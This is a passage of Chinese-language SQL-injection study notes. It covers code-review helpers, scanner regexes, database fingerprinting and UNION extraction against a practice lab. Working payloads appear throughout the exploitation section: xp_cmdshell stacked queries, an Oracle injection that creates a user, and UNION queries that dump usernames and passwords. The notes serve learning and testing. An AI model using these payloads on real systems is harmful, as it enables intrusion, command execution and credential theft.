<span class="token comment">-- @dbname - database name, by default all databases will be searched</span>
<span class="token keyword">ALTER</span> <span class="token keyword">PROCEDURE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>grep_sp<span class="token punctuation">]</span><span class="token variable">@text</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token variable">@dbname</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean">null</span>
<span class="token keyword">AS</span> <span class="token keyword">BEGIN</span>
<span class="token keyword">SET</span> NOCOUNT <span class="token keyword">ON</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token variable">@dbname</span> <span class="token operator">is</span> <span class="token boolean">null</span>
<span class="token keyword">begin</span>
<span class="token comment">-- enumerate all databases.</span>
<span class="token keyword">DECLARE</span> <span class="token comment">#db CURSOR FOR Select Name from master...sysdatabases declare 0c_dbname varchar(64)</span>
<span class="token keyword">OPEN</span> <span class="token comment">#db FETCH #db INTO @c_dbname</span>
<span class="token keyword">while</span> @<span class="token variable">@FETCH_STATUS</span> <span class="token operator">&lt;&gt;</span> <span class="token operator">-</span><span class="token number">1</span>
<span class="token keyword">begin</span>
<span class="token keyword">execute</span> grep_sp <span class="token variable">@text</span><span class="token punctuation">,</span> <span class="token variable">@c_dbname</span>
<span class="token keyword">FETCH</span> <span class="token comment">#db INTO @c_dbname</span>
<span class="token keyword">end</span>
<span class="token keyword">CLOSE</span> <span class="token comment">#db DEALLOCATE #db</span>
<span class="token keyword">end</span>
<span class="token keyword">else</span>
<span class="token keyword">begin</span>
<span class="token keyword">declare</span> <span class="token variable">@sql</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span>
<span class="token comment">-- create the find like command</span>
<span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'select '''</span> <span class="token operator">+</span> <span class="token variable">@dbname</span> <span class="token operator">+</span> <span class="token string">''' as db, o.name,m.definition'</span>
<span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token variable">@sql</span> <span class="token operator">+</span> <span class="token string">'from '</span><span class="token operator">+</span><span class="token variable">@dbname</span><span class="token operator">+</span><span class="token string">'.sys.sql_modules m '</span> 
<span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token variable">@sql</span> <span class="token operator">+</span> <span class="token string">'inner join '</span><span class="token operator">+</span><span class="token variable">@dbname</span><span class="token operator">+</span><span class="token string">'...sysobjects o on
m.object_id=o.id'</span>
<span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token variable">@sql</span> <span class="token operator">+</span> <span class="token string">'where [definition] like ''%'</span><span class="token operator">+</span><span class="token variable">@text</span><span class="token operator">+</span><span class="token string">'%'''</span> 
<span class="token keyword">execute</span> <span class="token punctuation">(</span><span class="token variable">@sql</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>
<span class="token keyword">END</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用储存过程</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">execute</span> grep_sp <span class="token string">'sp_executesql'</span><span class="token punctuation">;</span>
<span class="token keyword">execute</span> grep_sp <span class="token string">'EXEC'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>列出SQL Server 2008数据库中所有的存储过程</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>procedures <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> name <span class="token keyword">asc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>脚本</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@name</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token comment">-- database name</span>
<span class="token keyword">DECLARE</span> db_cursor <span class="token keyword">CURSOR</span> <span class="token keyword">FOR</span>
<span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>procedures<span class="token punctuation">;</span>
<span class="token keyword">OPEN</span> db_cursor
<span class="token keyword">FETCH</span> <span class="token keyword">NEXT</span> <span class="token keyword">FROM</span> db_cursor <span class="token keyword">INTO</span> <span class="token variable">@name</span>
<span class="token keyword">WHILE</span> @<span class="token variable">@FETCH_STATUS</span> <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">print</span> <span class="token variable">@name</span>
<span class="token comment">-- uncomment the line below to print the source</span>
<span class="token comment">-- sp_helptext '' + @name + ''</span>
<span class="token keyword">FETCH</span> <span class="token keyword">NEXT</span> <span class="token keyword">FROM</span> db_cursor <span class="token keyword">INTO</span> <span class="token variable">@name</span>
<span class="token keyword">END</span>
<span class="token keyword">CLOSE</span> db_cursor
<span class="token keyword">DEALLOCATE</span> db_cursor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>mysql获取储存过程</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">procedure</span> <span class="token keyword">status</span><span class="token punctuation">;</span><span class="token comment">#列出一系列储存过程</span>
<span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">procedure</span> sp_name<span class="token punctuation">;</span><span class="token comment">#列出sp_name的源代码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="自动复查源代码"><a href="#自动复查源代码" class="headerlink" title="自动复查源代码"></a>自动复查源代码</h3><h4 id="Graudit"><a href="#Graudit" class="headerlink" title="Graudit"></a>Graudit</h4><p>下载： <a target="_blank" rel="noopener" href="http://www.justanotherhacker.com/projects/graudit/">graudit (justanotherhacker.com)</a></p>
<p>规则</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">pg_query\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_exec\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_send_query\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_send_query_params\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_query_params\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_send_prepare\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_prepare\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_execute\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_insert\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_put_line\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_select\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>
pg_update\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="YASCA"><a href="#YASCA" class="headerlink" title="YASCA"></a>YASCA</h4><h4 id="Pixy"><a href="#Pixy" class="headerlink" title="Pixy"></a>Pixy</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql_db_query <span class="token keyword">SQL</span> injection configuration <span class="token keyword">file</span> <span class="token keyword">for</span> <span class="token keyword">user</span><span class="token operator">-</span>defined sink sinkType <span class="token operator">=</span> <span class="token keyword">sql</span>
mysql_db_query <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="AppCodeScan"><a href="#AppCodeScan" class="headerlink" title="AppCodeScan"></a>AppCodeScan</h4><p>.NET</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Scanning for SQL injections</span>
<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>SqlCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>DbCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>OleDbCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>SqlUtility<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>OdbcCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>OleDbDataAdapter<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>SqlDataSource<span class="token punctuation">.</span><span class="token operator">*</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="OWASP-LAPSE-项目"><a href="#OWASP-LAPSE-项目" class="headerlink" title="OWASP LAPSE+项目"></a>OWASP LAPSE+项目</h4><h4 id="Microsoft-SQL注入源代码分析器"><a href="#Microsoft-SQL注入源代码分析器" class="headerlink" title="Microsoft SQL注入源代码分析器"></a>Microsoft SQL注入源代码分析器</h4><h4 id="CAT-NET"><a href="#CAT-NET" class="headerlink" title="CAT.NET"></a>CAT.NET</h4><h4 id="RIPS——PHP脚本漏洞的静态源代码分析器"><a href="#RIPS——PHP脚本漏洞的静态源代码分析器" class="headerlink" title="RIPS——PHP脚本漏洞的静态源代码分析器"></a>RIPS——PHP脚本漏洞的静态源代码分析器</h4><h4 id="CodePro-AnalytiX"><a href="#CodePro-AnalytiX" class="headerlink" title="CodePro AnalytiX"></a>CodePro AnalytiX</h4><h4 id="Teachable-Static-Analysis-Workbench"><a href="#Teachable-Static-Analysis-Workbench" class="headerlink" title="Teachable Static Analysis Workbench"></a>Teachable Static Analysis Workbench</h4><h4 id="商业源代码复查工具"><a href="#商业源代码复查工具" class="headerlink" title="商业源代码复查工具"></a>商业源代码复查工具</h4><h4 id="Fortify源代码分析器"><a href="#Fortify源代码分析器" class="headerlink" title="Fortify源代码分析器"></a>Fortify源代码分析器</h4><h4 id="Rational-AppScan-Source-Edition"><a href="#Rational-AppScan-Source-Edition" class="headerlink" title="Rational AppScan Source Edition"></a>Rational AppScan Source Edition</h4><h4 id="CodeSecure"><a href="#CodeSecure" class="headerlink" title="CodeSecure"></a>CodeSecure</h4><h4 id="Klocwork-Solo"><a href="#Klocwork-Solo" class="headerlink" title="Klocwork Solo"></a>Klocwork Solo</h4><h2 id="利用SQL注入"><a href="#利用SQL注入" class="headerlink" title="利用SQL注入"></a>利用SQL注入</h2><h3 id="常见的漏洞利用技术"><a href="#常见的漏洞利用技术" class="headerlink" title="常见的漏洞利用技术"></a>常见的漏洞利用技术</h3><p>本章大多用这个示例</p>
<p><a target="_blank" rel="noopener" href="http://sql/Less-2/?id=1">http://sql/Less-2/?id=1</a></p>
<p><img src="https://images.dadream.eu.org/images/2024/07/dd9f49a480d63d71849c61af3a1bb103.png"></p>
<h4 id="使用堆叠注入"><a href="#使用堆叠注入" class="headerlink" title="使用堆叠注入"></a>使用堆叠注入</h4><p>堆叠查询（stacked query）指的是在单个数据库连接中执行多个查询序列，使用不同的数据库和不同的web框架，对堆叠查询支持情况也不同，使用ASP.NET和PHP访问Microsoft SQL Server时允许堆叠查询，但如果使用Java来访问，就不允许。使用PHP访问PostgreSQL时， PHP允许堆叠查询，但如果访问MySQL, PHP不允许堆叠查询。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp=id=l;exec+master..xp_cmdshell+'dir'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="在Web应用程序中利用Oracle漏洞"><a href="#在Web应用程序中利用Oracle漏洞" class="headerlink" title="在Web应用程序中利用Oracle漏洞"></a>在Web应用程序中利用Oracle漏洞</h4><p>Oracle SQL语法不支持堆叠查询，PL/SQL是内置在Oracle中的，它拓展了SQL并允许执行堆叠的命令，使用一个匿名PL/SQL块，它包含在一条BEGIN语句与一条END语句之间，是一个自由编写的PL/SQL块。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SQL</span><span class="token operator">&gt;</span><span class="token keyword">DECLARE</span>
MESG VARCHAR2 <span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
MESG:<span class="token operator">=</span><span class="token string">'HELLO WORLD'</span><span class="token punctuation">;</span>
DBMS_OUTPUT<span class="token punctuation">.</span>PUT_LINE<span class="token punctuation">(</span>MESG<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Oracle默认安装了两个允许执行匿名PL/SQL块的函数</p>
<p><code>dbms_xmlquery.newcontext()</code> <code>dbms_xmlquery.getxml()</code></p>
<p>public用户默认允许访问这两个函数，所以可以使用这两个函数来执行DML/DDL语句块，形成SQL注入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext('declare PRAGMA AUT0N0M0US_TRANSACTI0N; begin execute immediate '' create user pwned identified by pwn3d ''; commit; end;') from dual) is not null -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="识别数据库"><a href="#识别数据库" class="headerlink" title="识别数据库"></a>识别数据库</h3><p>ASP和.NET通常使用Microsoft SQL Server 作为后台数据库，而PHP应用则很可能使用MySQL或PostgreSQL。如果应用是用Java编写的，那么使用的可能是Oracle或MySQL。此外，底层操作系统也可以提供一些线索：安装 IIS（Intemet信息服务器）作为服务器平台标志着应用是基于Windows的架构，后台数据库很可能是SQLServer。而运行Apache和PHP的Linux服务器则很可能使用的是开源数据库，比如 MySQL或PostgreSQL。</p>
<h4 id="非盲跟踪"><a href="#非盲跟踪" class="headerlink" title="非盲跟踪"></a>非盲跟踪</h4><p>查询使用的数据库服务器技术不同，这条SQL产生的错误也会不同，可以根据这些不同判断出数据库类型。</p>
<p>下面是常见的报错</p>
<ul>
<li><p>mssql</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e14'</span>
<span class="token punctuation">[</span>Microsof<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC <span class="token keyword">SQL</span> Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">SQL</span> Server<span class="token punctuation">]</span>Unclosed quotation mark <span class="token keyword">after</span> the <span class="token keyword">character</span>
string"<span class="token punctuation">.</span>
<span class="token operator">/</span>products<span class="token punctuation">.</span>asp<span class="token punctuation">,</span>line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>mysql</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ERROR <span class="token number">1064</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span> : You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span>
near<span class="token string">' '</span>at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p>oracle</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ORA<span class="token operator">-</span><span class="token number">01773</span>:may <span class="token operator">not</span> specify <span class="token keyword">column</span> datatypes <span class="token operator">in</span> this <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>postgreSQL</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">pg_query<span class="token punctuation">(</span><span class="token punctuation">)</span>: Query failed: ERROR: unterminated quoted string at <span class="token operator">or</span> near at <span class="token keyword">character</span> <span class="token number">69</span> <span class="token operator">in</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>php<span class="token operator">/</span>somepge<span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h5 id="获取标志信息"><a href="#获取标志信息" class="headerlink" title="获取标志信息"></a>获取标志信息</h5><table>
<thead>
<tr>
<th>数据库服务器</th>
<th>查询</th>
</tr>
</thead>
<tbody><tr>
<td>MSSQL</td>
<td>select @@version</td>
</tr>
<tr>
<td>Mysql</td>
<td>select version()  <br>select @@version</td>
</tr>
<tr>
<td>Oralce</td>
<td>select banner from v$version<br>select banner from v$version where rownum=1</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>select version()</td>
</tr>
</tbody></table>
<ul>
<li>mssql</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=@@version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>数据库将传入的@@version当做数字型解析产生报错</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC <span class="token keyword">SQL</span> Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">SQL</span> Server<span class="token punctuation">]</span>Conversion failed <span class="token keyword">when</span> converting the
nvarchar <span class="token keyword">value</span> <span class="token string">'Microsoft SQL Server 2005-9.00.3042.00 (Intel X86) Feb 9 2007 22:47:07 Copyright (c) 1988-2005 Microsoft Corporation Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)'</span><span class="token keyword">to</span> <span class="token keyword">data</span> <span class="token keyword">type</span> <span class="token keyword">int</span><span class="token punctuation">.</span>
<span class="token operator">/</span>products<span class="token punctuation">.</span>asp<span class="token punctuation">.</span>line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这段错误代码表明了数据库为SQL Server 2005，补丁Service Pack 2</p>
<ul>
<li>PostgreSQL</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">PostgreSQL <span class="token number">9.1</span><span class="token number">.1</span> <span class="token keyword">on</span> i686<span class="token operator">-</span>pc<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token punctuation">,</span> compiled <span class="token keyword">by</span> i686<span class="token operator">-</span>pc<span class="token operator">-</span>linuxgnu<span class="token operator">-</span> gcc <span class="token punctuation">(</span>Gentoo Hardened <span class="token number">4.4</span><span class="token number">.5</span> pl<span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">,</span> pie<span class="token operator">-</span><span class="token number">0.4</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token operator">-</span><span class="token keyword">bit</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>同样返回了很多底层的信息</p>
<p>使用具有标志性的字符串或者语句注入，在返回结果（报错结果）中寻找改字符串或者语句的执行结果，如果找到了，这儿就可以作为注入点。</p>
<p>SQL Server内置变量</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">@<span class="token variable">@version</span>:数据库服务器版本。
@<span class="token variable">@servemame</span>:安装<span class="token keyword">SQL</span> Server的服务器名称。
@<span class="token variable">@language</span>：当前所使用语言的名称。
@<span class="token variable">@spid</span>：当前用户的进程ID。
可以使用下列查询获取详细的版本信息：
<span class="token keyword">SELECT</span> SERVERPROPERTYCproductversion’<span class="token punctuation">)</span>：例如<span class="token number">100.1600</span><span class="token number">.22</span>。 
<span class="token keyword">SELECT</span> SERVERPROPERTY<span class="token punctuation">(</span><span class="token string">'productlevel'</span><span class="token punctuation">)</span>:例如 RTM。
<span class="token keyword">SELECT</span> SERVERPROPERTY<span class="token punctuation">(</span><span class="token string">'edition'</span><span class="token punctuation">)</span>:例如 Enterprise。
<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>msver：更多详细信息，包括处理器数量、处理器类型、物理内存等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="盲追踪"><a href="#盲追踪" class="headerlink" title="盲追踪"></a>盲追踪</h4><p>应用不会返回信息时，利用不同数据库使用SQL语法不同产生的差异来判断数据库类型。</p>
<h5 id="连接字符串的方式"><a href="#连接字符串的方式" class="headerlink" title="连接字符串的方式"></a>连接字符串的方式</h5><p>用不同的支付串连接方式注入，通过原始请求返回结果对比，若相同，则为对应数据库。</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/db5df62ba1c448f7b78f246d43b03ad3.png"></p>
<h5 id="数字函数"><a href="#数字函数" class="headerlink" title="数字函数"></a>数字函数</h5><p>相当于不同数据库的特征值，原理和前面相似</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/87b6f9ee5436f469cb58fd426a00d7c1.png"></p>
<p>例如，成功注入<code>WAITEOR DELAY</code>，表明数据库是mssql，成功注入<code>select pg_sleep(10)</code>，表明数据库是PostgreSQL</p>
<p>Mysql精确确定版本</p>
<p><code>/* !版本号 语句*/</code>若数据库版本号高于或等于！后面的，就会执行语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span> <span class="token comment">/* !40119 + 1*/</span>
<span class="token comment">-- 2（如果MySQL版本为4.01.19或更高版本）</span>
<span class="token comment">-- 1（其他情况）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="使用UNION语句提取数据"><a href="#使用UNION语句提取数据" class="headerlink" title="使用UNION语句提取数据"></a>使用UNION语句提取数据</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">column</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span>N <span class="token keyword">FROM</span> <span class="token keyword">table</span><span class="token operator">-</span><span class="token number">1</span>
<span class="token keyword">UNION</span>
<span class="token keyword">SELECT</span> <span class="token keyword">column</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span>N <span class="token keyword">FROM</span> <span class="token keyword">table</span><span class="token operator">-</span><span class="token number">2</span>
<span class="token comment">-- 去除重复值</span>
<span class="token keyword">UNION</span> <span class="token keyword">ALL</span><span class="token comment">-- 重复的也显示</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>返回有这两张表或者两个查询得到的数据</p>
<h4 id="匹配列"><a href="#匹配列" class="headerlink" title="匹配列"></a>匹配列</h4><p>满足要求</p>
<ul>
<li>两个查询的列数必须相同</li>
<li>两个select对应列返回的数据类型是兼容的</li>
</ul>
<p>如果无法满足这两个条件就会查询失败并返回一个错误，下面是一些数据库返回的错误</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/e78b0ba30b6e81959a8c7d560b34f51b.png"></p>
<p>要得到正确的列数，两种方法</p>
<ul>
<li><p>每次增加列数，不断尝试</p>
<p>NULL值会转化为其他任何数据类型，这样能避免因数据类型不同而产生错误。</p>
<p>mysql</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+null-- </span>
http:<span class="token comment">//test/?id=12+union+select+null,null-- </span>
http:<span class="token comment">//test/?id=12+union+select+null,null,null-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>oracle要求每个select必须带from，使用dual（所用用户都能访问）表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+null+from+dual-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用order by字句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=12+order+by+1</span>
http:<span class="token comment">//sql/Less-2/?id=12+order+by+2</span>
http:<span class="token comment">//sql/Less-2/?id=12+order+by+3</span>
<span class="token comment">-- etc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>若3报错了，2未报错，那么就是两列</p>
<p>相对下，第二种更优，可以使用二分查找</p>
</li>
</ul>
<h4 id="匹配数据类型"><a href="#匹配数据类型" class="headerlink" title="匹配数据类型"></a>匹配数据类型</h4><p>假设需要查询一个字符串值，利用一个支付串值一个一个依次替换NULL值，只要不报错，就能确定位置。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+' test',NULL,NULL,NULL </span>
http:<span class="token comment">//test/?id=12+union+select+NULL,'test',NULL,NULL </span>
http:<span class="token comment">//test/?id=12+union+select+NULL,NULL,'test',NULL </span>
http:<span class="token comment">//test/?id=12+union+select+NULL,NULL,NULL,'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>有些数据库不能使用NULL，只能暴力破解，使用自动化工具</p>
<p>假设最后一个位置是字符串值，便可以开始检索想要获得的值</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+NULL,version(),NULL,NULL</span>
<span class="token comment">-- 获取版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>也可以连接多条语句返回多条信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+NULL,concat(version(),0x7e,database()),NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果想要检索的不是字符串字，却只有支付串值的字段，可以使用强制转换为字符串</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/2a1757616fa87006e38575c695c27afd.png"></p>
<p>PostgreSQL允许使用<code>||</code>连接字符串，只要有一个变量是字符串即可作为字符串值</p>
<h4 id="只返回一条结果"><a href="#只返回一条结果" class="headerlink" title="只返回一条结果"></a>只返回一条结果</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=12 union select NULL,username,password from users</span>
<span class="token comment">-- 正常来说这条语句可以返回表中所有数据，但是有时只会返回一条数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=1 and 1=0 union select NULL,username,password from users</span>
